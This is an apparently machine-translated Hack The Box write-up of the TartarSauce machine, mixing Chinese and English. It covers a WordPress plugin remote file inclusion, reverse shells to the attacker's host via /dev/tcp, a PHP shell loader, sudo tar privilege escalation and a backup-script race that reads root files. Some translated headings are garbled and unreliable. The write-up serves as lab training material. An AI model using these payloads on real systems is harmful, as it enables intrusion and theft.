# 高温灭菌器：鞑靼酱

[0xdf.gitlab.io](https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html)0xdf黑客的东西

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ftartar-cover.png)TartarSauce是一个有很多步骤的盒子，并且围绕着两个主题进行了有趣的关注：恶搞我们和焦油二进制。对于初始访问，我会发现一个几乎没有功能 WordPress 的网站，其插件容易受到远程文件包含。在滥用RFI获得外壳后，我将私有化两次，两次都以焦油为中心;一次通过sudo tar，一次需要在睡眠用完之前操纵存档。在Beyond root中，我将查看我掉下来的一些兔子洞，并显示我创建的简短脚本，以快速获得初始访问权限，并在一个步骤中完成第一个 privesc。

*   n地图
*   网站 - 端口 80
    *   网站
    *   戈克斯特
    *   中文网站
        *   网站
        *   断续器
*   壳牌作为万维数据
    *   RFI in gwolle-gb
    *   断续器
    *   壳
*   Privesc： www-data –> 大沼
    *   苏多焦油
    *   用苏多塔升级的两种方式
        *   –至命令
        *   –检查点操作
    *   用户.txt
*   部分权限：大沼 –>文件以根目录读取
    *   用伪皮识别克龙
    *   了解备份程序
    *   利用备份程序
*   超越根
    *   快捷方式外壳作为大沼
    *   兔子洞：蒙斯特拉CMS
        *   机器人.txt
        *   网站
        *   利用漏洞利用尝试
        *   故障说明

## n地图

唯一开放的端口是 web on 80：

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.88
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-22 12:21 EDT
    Warning: 10.10.10.88 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.10.10.88
    Host is up (0.098s latency).
    Not shown: 65467 closed ports, 67 filtered ports
    PORT   STATE SERVICE
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 26.34 seconds
    
    root@kali:~/hackthebox/tartarsauce-10.10.10.88# nmap -sC -sV -p 80 -oA nmap/initial 10.10.10.88
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-22 12:25 EDT
    Nmap scan report for 10.10.10.88
    Host is up (0.095s latency).
    
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    | http-robots.txt: 5 disallowed entries
    | /webservices/tar/tar/source/
    | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
    |_/webservices/developmental/ /webservices/phpmyadmin/
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Landing Page
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
    
    

这个盒子看起来像Ubuntu，可能是基于阿帕奇版本的Xenial 16.04。

`nmap`还揭示了一个，它给出了一些有趣的利用路径。这些都是兔子洞，但我将在本文末尾介绍我的探索。`/robots.txt`

## 网站 - 端口 80

### 网站

该网站本身就是一瓶鞑靼酱的巨大阿西艺术：

![1527006309843](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1527006309843.png)

查看源代码，有一堆空行，后跟一条评论，.看起来盒子作者喜欢恶搞。`<!--Carry on, nothing to see here :D-->`

### 戈克斯特

在确定蒙斯特拉CMS是一条死胡同之后，回到枚举。 提供了另一个路径， ：`gobuster``/webservices`

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -u http://10.10.10.88 -o gobuster/port80root.txt
    
    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.10.88/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Output file  : gobuster/port80root.txt
    [+] Status codes : 301,302,307,200,204
    [+] Extensions   : .txt,.php,.html
    =====================================================
    /index.html (Status: 200)
    /robots.txt (Status: 200)
    /webservices (Status: 301)
    =====================================================
    

尝试访问 URL 只会返回 403 禁止访问。但另一轮给出了一条路径：`/webservices``gobuster``/wp`

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -u http://10.10.10.88/webservices -o gobust
    er/port80webservices -t 30
    
    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.10.88/webservices/
    [+] Threads      : 30
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Output file  : gobuster/port80webservices
    [+] Status codes : 307,200,204,301,302
    [+] Extensions   : .txt,.php,.html
    =====================================================
    /wp (Status: 301)
    =====================================================
    

### WordPress Site

#### Site

The site is broken.

![1527526664696](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1527526664696.png)

WordPress sites are commonly broken in htb because they link to things using the dns names, and that can be fixed by adding the hostname to the file. That is not the case here. Looking at the page source, there’s a bunch of links that look like this: `/etc/hosts``<link rel="alternate" type="application/rss+xml" title="Test blog &raquo; Feed" href="http:/10.10.10.88/webservices/wp/index.php/feed/" />`

Someone left the second off after . This can be fixed using burp, to modify requests or responses. I added this filter:`/``http:`

![1527526834227](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1527526834227.png)

With that, the page loads, albeit still only a 404:

![1527526872427](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1527526872427.png)

#### wpscan

`wpscan` is a good tool to enumerate WordPress sites. I’ll use option to enumerate plugins, themes, and users. The output is quite long, but snipped to show that it identifies three plugins:`--enumerate p,t,u`

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# wpscan -u http://10.10.10.88/webservices/wp/ --enumerate p,t,u | tee wpscan.log
    _______________________________________________________________
            __          _______   _____
            \ \        / /  __ \ / ____|
             \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
              \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
               \  /\  /  | |     ____) | (__| (_| | | | |
                \/  \/   |_|    |_____/ \___|\__,_|_| |_|
    
            WordPress Security Scanner by the WPScan Team
                           Version 2.9.3
              Sponsored by Sucuri - https://sucuri.net
       @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
    _______________________________________________________________
    ...
    [+] We found 3 plugins:
    
    [+] Name: akismet - v4.0.3
     |  Last updated: 2018-05-26T17:14:00.000Z
     |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
     |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
    [!] The version is out of date, the latest version is 4.0.6
    
    [+] Name: brute-force-login-protection - v1.5.3
     |  Latest version: 1.5.3 (up to date)
     |  Last updated: 2017-06-29T10:39:00.000Z
     |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
     |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
    
    [+] Name: gwolle-gb - v2.3.10
     |  Last updated: 2018-05-12T10:06:00.000Z
     |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
     |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
    [!] The version is out of date, the latest version is 2.5.2
    
    [+] Enumerating installed themes (only ones marked as popular) ...
    ...
    

While none of those appear vulnerable to anything, looking at the readmes for each reveals something interesting… from :`http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt`

    == Changelog ==
    
    = 2.3.10 =
    * 2018-2-12
    * Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
    

So, this box author definitely likes to troll.

## Shell as www-data

### RFI in gwolle-gb

There’s a [RFI vulnerability in Gwolle Guestbook v 1.5.3](https://www.htbridge.com/advisory/HTB23275). In this case, visiting will include that file.`http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip/path`

### POC

To test this, I first started a python http server on my host, and then visited the site:

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/
    

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.88 - - [28/May/2018 15:10:22] "GET /wp-load.php HTTP/1.0" 404 -
    

### Shell

I’ll grab from on Kali. There’s a couple lines you have to customize with your own IP and desired callback port. Then I’ll name it , and open a listener, and run that again:`php-reverse-shell.php``/usr/share/webshells/php``wp-load.php``nc``curl`

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/
    

    10.10.10.88 - - [28/May/2018 15:15:03] "GET /wp-load.php HTTP/1.0" 200 -
    

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# nc -lnvp 1234
    listening on [any] 1234 ...
    connect to [10.10.15.99] from (UNKNOWN) [10.10.10.88] 43868
    Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 i686 i686 GNU/Linux
     15:15:43 up  2:35,  0 users,  load average: 0.15, 0.04, 0.07
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

## Privesc: www-data –> onuma

As , we can’t get into the lone user directory:`www-data`

    www-data@TartarSauce:/home$ ls
    onuma
    www-data@TartarSauce:/home$ cd onuma/
    bash: cd: onuma/: Permission denied
    

### sudo tar

Notice that user can run with no password for :`www-data``sudo``/bin/tar`

    www-data@TartarSauce:/dev/shm$ sudo -l
    Matching Defaults entries for www-data on TartarSauce:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User www-data may run the following commands on TartarSauce:
        (onuma) NOPASSWD: /bin/tar
    

### Two Ways to Escalate with sudo tar

#### –to-command

The take advantage of this, first create a shell script that will provide a reverse shell to my host. Then put it into a tar archive.

    www-data@TartarSauce:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.15.99/8082 0>&1' > a.sh
    www-data@TartarSauce:/dev/shm$ tar -cvf a.tar a.sh
    a.sh
    

Then I’ll run with the option. This option takes the output of the tar command, and passes it to another binary for processing. In this case, I’m having my shell script to get a shell passed to bash to run it.`tar``--to-command`

    www-data@TartarSauce:/dev/shm$ sudo -u onuma tar -xvf a.tar --to-command /bin/bash
    

And I get a callback as onuma:

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# nc -lnvp 8082
    listening on [any] 8082 ...
    connect to [10.10.15.99] from (UNKNOWN) [10.10.10.88] 47320
    onuma@TartarSauce:/dev/shm$ id
    id
    uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
    onuma@TartarSauce:/dev/shm$
    

#### –checkpoint-action

But even better, this privesc can be done in one line!

We’ll take advantage of the options for checkpoints. The flag tells tar to take some action every x bytes, as a progress update. The default behavior is to print a status message. However, the parameter allows the user to specify what action to take at a check point. So I can have it just give me a shell:`tar``--checkpoint=x``--checkpoint-action`

    www-data@TartarSauce:/$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
    <ll /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
    tar: Removing leading `/' from member names
    onuma@TartarSauce:/$ id
    id
    uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
    

### user.txt

The shell, get user flag:

    onuma@TartarSauce:~$ wc -c user.txt
    33 user.txt
    onuma@TartarSauce:~$ cat user.txt
    b2d6ec45...
    

## Partial Privesc: onuma –> File Read as root

As far as I know, there’s no way to exploit this box to get a root shell. But I can read files as root.

### Identify cron with pspy

[pspy](https://github.com/DominicBreuker/pspy) is my go-to for processes detection. In this case, letting run for a bit shows a script that runs as root every 5 minutes:`pspy32`

    2018/05/29 07:56:33 CMD: UID=0    PID=24065  | /bin/bash /usr/sbin/backuperer
    

### Understanding backeruperer

The script is as follows:

    #!/bin/bash
    
    #-------------------------------------------------------------------------------------
    # backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
    # ONUMA Dev auto backup program
    # This tool will keep our webapp backed up in case another skiddie defaces us again.
    # We will be able to quickly restore from a backup in seconds ;P
    #-------------------------------------------------------------------------------------
    
    # Set Vars Here
    basedir=/var/www/html
    bkpdir=/var/backups
    tmpdir=/var/tmp
    testmsg=$bkpdir/onuma_backup_test.txt
    errormsg=$bkpdir/onuma_backup_error.txt
    tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
    check=$tmpdir/check
    
    # formatting
    printbdr()
    {
        for n in $(seq 72);
        do /usr/bin/printf $"-";
        done
    }
    bdr=$(printbdr)
    
    # Added a test file to let us see when the last backup was run
    /usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg
    
    # Cleanup from last time.
    /bin/rm -rf $tmpdir/.* $check
    
    # Backup onuma website dev files.
    /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
    
    # Added delay to wait for backup to complete if large files get added.
    /bin/sleep 30
    
    # Test the backup integrity
    integrity_chk()
    {
        /usr/bin/diff -r $basedir $check$basedir
    }
    
    /bin/mkdir $check
    /bin/tar -zxvf $tmpfile -C $check
    if [[ $(integrity_chk) ]]
    then
        # Report errors so the dev can investigate the issue.
        /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
        integrity_chk >> $errormsg
        exit 2
    else
        # Clean up and save archive to the bkpdir.
        /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
        /bin/rm -rf $check .*
        exit 0
    fi
    

I’ll try to break this down into it’s important steps:

1.  Use the command as onuma to take everything in () and save it as a gzip archive () named . is , so we know it will start with a , and what folder it will be in, but nothing else.`tar``$basedir``/var/www/html``-z``$tmpfile``$tmpfle``/var/tmp/.[random sha1]``.`
    
        # Backup onuma website dev files.
        /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
        
    
2.  Sleep for 30 seconds:
    
        # Added delay to wait for backup to complete if large files get added.
        /bin/sleep 30
        
    
3.  Make a temporary directory at :`/var/tmp/check`
    
        /bin/mkdir $check
        
    
4.  Extract into :`$tmpfile``/var/tmp/check`
    
        /bin/tar -zxvf $tmpfile -C $check
        
    
5.  Run the function, and it is exits cleanly, move the temp archive to , and if not, run again, and append its output to `integrity_chk``/var/backups/onuma-www-dev.bak``integrity_chk``/vat/backups/onuma_backup_error.txt`
    
        if [[ $(integrity_chk) ]]
        then
            # Report errors so the dev can investigate the issue.
            /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
            integrity_chk >> $errormsg
            exit 2
        else
            # Clean up and save archive to the bkpdir.
            /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
            /bin/rm -rf $check .*
            exit 0
        fi
        
    

The function is very simple, a recursive between the source directory and the same directory that was taken out of the gzip archive.`integrity_chk``diff``/var/www/html`

### Exploiting backeruperer

To exploit this script, I’ll take advantage of two things: the sleep, and the recursive diff. During the sleep, I’ll unpack the archive, replace one of the files with a link to , and re-archive it. Then when the script opens the archive and runs the diff, the resulting file will be different, and the contents of both files will end up in the log file.`/root/root.txt`

I originally did this with a long bash one-liner, but it is easier to follow with a script:

    #!/bin/bash
    
    # work out of shm
    cd /dev/shm
    
    # set both start and cur equal to any backup file if it's there
    start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")
    
    # loop until there's a change in cur
    echo "Waiting for archive filename to change..."
    while [ "$start" == "$cur" -o "$cur" == "" ] ; do
        sleep 10;
        cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
    done
    
    # Grab a copy of the archive
    echo "File changed... copying here"
    cp $cur .
    
    # get filename
    fn=$(echo $cur | cut -d'/' -f4)
    
    # extract archive
    tar -zxf $fn
    
    # remove robots.txt and replace it with link to root.txt
    rm var/www/html/robots.txt
    ln -s /root/root.txt var/www/html/robots.txt
    
    # remove old archive
    rm $fn
    
    # create new archive
    tar czf $fn var
    
    # put it back, and clean up
    mv $fn $cur
    rm $fn
    rm -rf var
    
    # wait for results
    echo "Waiting for new logs..."
    tail -f /var/backups/onuma_backup_error.txt
    

现在，将其上传到目标并运行它。我将它命名为opsec：`.b.sh`

    onuma@TartarSauce:/dev/shm$ ./.b.sh
    ./.b.sh
    Waiting for archive filename to change...
    File changed... copying here
    Waiting for new logs...
    ------------------------------------------------------------------------
    Integrity Check Error in backup last ran :  Thu Oct 18 19:42:26 EDT 2018
    ------------------------------------------------------------------------
    /var/tmp/.02af91fa0edeab13fce3962cddc45efefc22da67
    diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
    1,7c1
    < User-agent: *
    < Disallow: /webservices/tar/tar/source/
    < Disallow: /webservices/monstra-3.0.4/
    < Disallow: /webservices/easy-file-uploader/
    < Disallow: /webservices/developmental/
    < Disallow: /webservices/phpmyadmin/
    <
    ---
    > e79abdab...
    

还有旗帜。

作为一行，它看起来像这样：

    onuma@TartarSauce:/dev/shm$ cd /dev/shm; start=$(find /var/tmp -maxdepth 1 -type f -name ".*"); cur=$(find /var/tmp -maxdepth 1 -type f -name ".*"); while [ "$start" == "$cur" -o "$cur" == "" ] ; do sleep 10; cur=$(find /var/tmp -maxdepth 1 -type f -name ".*"); done; echo "File changed... copying here"; cp $cur .; fn=$(echo $cur | cut -d'/' -f4); tar -zxf $fn; rm var/www/html/robots.txt; ln -s /root/root.txt var/www/html/robots.txt; rm $fn; tar czf $fn var; mv $fn $cur; rm $fn; rm -rf var
    File changed... copying here
    
    onuma@TartarSauce: cat /var/backups/onuma_backup_error.txt
    ...
    ------------------------------------------------------------------------
    Integrity Check Error in backup last ran :  Wed May 30 09:38:30 EDT 2018
    ------------------------------------------------------------------------
    /var/tmp/.154b63306d83a3c63fb5d432d97be7807b521909
    diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
    1,7c1
    < User-agent: *
    < Disallow: /webservices/tar/tar/source/
    < Disallow: /webservices/monstra-3.0.4/
    < Disallow: /webservices/easy-file-uploader/
    < Disallow: /webservices/developmental/
    < Disallow: /webservices/phpmyadmin/
    <
    ---
    > e79abdab...
    Only in /var/www/html/webservices/monstra-3.0.4/public/uploads: .empty
    

## Beyond Root

### Shortcut Shell as onuma

In case I ever wanted to come back to this box and pick up with a shell as onuma, this alternative php script will provide a reverse shell as onuma.

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# cat awp-load.php
    <?php
    system("echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.5/8082 0>&1' > /dev/shm/.a.sh");
    system("cd / && sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"bash /dev/shm/.a.sh\"");
    ?>
    

该脚本只是让 php 系统命令执行上面 privesc 中所示的步骤，编写一个 shell 脚本，将其放入 tar 存档中，然后使用它来运行它。`sudo tar`

因此，要使其正常工作，只需在 8082 上启动，然后运行 。`python3 -m http.server 80``nc``curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/a`

### 兔子洞：蒙斯特拉CMS

作者的另一个超级巨魔举动是添加一个包含多个有趣站点的文件，其中一个站点存在，并且具有针对它的RCE漏洞，但是，它们都不能工作。以下是我如何探索它，以及为什么漏洞利用不起作用。`robot.txt`

#### 机器人.txt

`nmap`调用具有几个有趣站点的文件的存在：`robots.txt`

    User-agent: *
    Disallow: /webservices/tar/tar/source/
    Disallow: /webservices/monstra-3.0.4/
    Disallow: /webservices/easy-file-uploader/
    Disallow: /webservices/developmental/
    Disallow: /webservices/phpmyadmin/
    

我将使用一个快速 bash 循环来获取不允许的条目，获取 url 路径，并循环访问它们，每个回显一个标题行，然后发出一个 curl 来获取它们。在五个 URL 中，只有一个不返回 404 未找到错误：

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# curl -s 10.10.10.88/robots.txt | tail -6 | head -5 | cut -d' ' -f2 | while read p; do echo ===${p}===; curl -s 10.10.10.88${p} | head; echo; done
    ===/webservices/tar/tar/source/===
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL /webservices/tar/tar/source/ was not found on this server.</p>
    <hr>
    <address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.88 Port 80</address>
    </body></html>
    
    ===/webservices/monstra-3.0.4/===
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <link rel="dns-prefetch" href="/webservices/monstra-3.0.4" />
    <link rel="dns-prefetch" href="//www.google-analytics.com" />
    <title>TartarSauce - Home</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Site description">
    
    ===/webservices/easy-file-uploader/===
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL /webservices/easy-file-uploader/ was not found on this server.</p>
    <hr>
    <address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.88 Port 80</address>
    </body></html>
    
    ===/webservices/developmental/===
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL /webservices/developmental/ was not found on this server.</p>
    <hr>
    <address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.88 Port 80</address>
    </body></html>
    
    ===/webservices/phpmyadmin/===
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL /webservices/phpmyadmin/ was not found on this server.</p>
    <hr>
    <address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.88 Port 80</address>
    </body></html>
    

#### Site

Looking at the page itself, it’s a default landing page, and most the links are broken:

![1527018851631](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1527018851631.png)

The link in the center of that page takes us to a login page:`logged in`

![1527018911893](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1527018911893.png)

幸运的是，/的用户名/密码让我们进入：`admin``admin`

![1527018951948](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1527018951948.png)

#### 利用漏洞利用尝试

`monstra CMS v3.0.4`其中有几个漏洞：

    root@kali:~/hackthebox/tartarsauce-10.10.10.88# searchsploit monstra
    -------------------------------------------------- -----------------------------------
     Exploit Title                                    |  Path
                                                      | (/usr/share/exploitdb/)
    -------------------------------------------------- -----------------------------------
    Monstra CMS 1.2.0 - 'login' SQL Injection         | exploits/php/webapps/38769.txt
    Monstra CMS 1.2.1 - Multiple HTML Injection Vulne | exploits/php/webapps/37651.html
    Monstra CMS 3.0.3 - Multiple Vulnerabilities      | exploits/php/webapps/39567.txt
    Monstra CMS 3.0.4 - Arbitrary File Upload / Remot | exploits/php/webapps/43348.txt
    Monstra CMS 3.0.4 - Arbitrary Folder Deletion     | exploits/php/webapps/44512.txt
    Monstra CMS 3.0.4 - Remote Code Execution         | exploits/php/webapps/44621.txt
    Monstra cms 3.0.4 - Persitent Cross-Site Scriptin | exploits/php/webapps/44502.txt
    -------------------------------------------------- -----------------------------------
    Shellcodes: No Result
    

RCE （44621） 要求作为可以上载的用户进行访问。任意文件上载 （43348） 需要可以编辑的用户。XSS （44502） 也是如此。

访问看起来像是提供文件上传，但一切都失败了。`admin`

#### 故障说明

在盒子上有一个shell，可以快速了解文件上传失败的原因。以路径开头的文件夹结构是私有的，只能由 root 写入：`/webservices`

    onuma@TartarSauce:/var/www$ ls -la html
    total 28
    drwxr-xr-x 3 www-data www-data  4096 Feb 21  2018 .
    drwxr-xr-x 3 root     root      4096 Feb  9  2018 ..
    -rw-r--r-- 1 root     root     10766 Feb 21  2018 index.html
    -rw-r--r-- 1 root     root       208 Feb 21  2018 robots.txt
    drwxr-xr-x 4 root     root      4096 Feb 21  2018 webservices
    

例如，Monsta 尝试将文件上载到 ，但该文件夹无法通过 www-data 写入，这就是 Apache 运行的方式：`/var/www/html/webservices/monstra-3.0.4/public/uploads`

    onuma@TartarSauce:/var/www/html/webservices/monstra-3.0.4/public$ ls -ld uploads
    drw-rw-r-x 2 root root 4096 Feb 21  2018 uploads
    

该网站具有相同的权限。我只是不需要写任何东西来使用RFI漏洞来获得shell。

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html)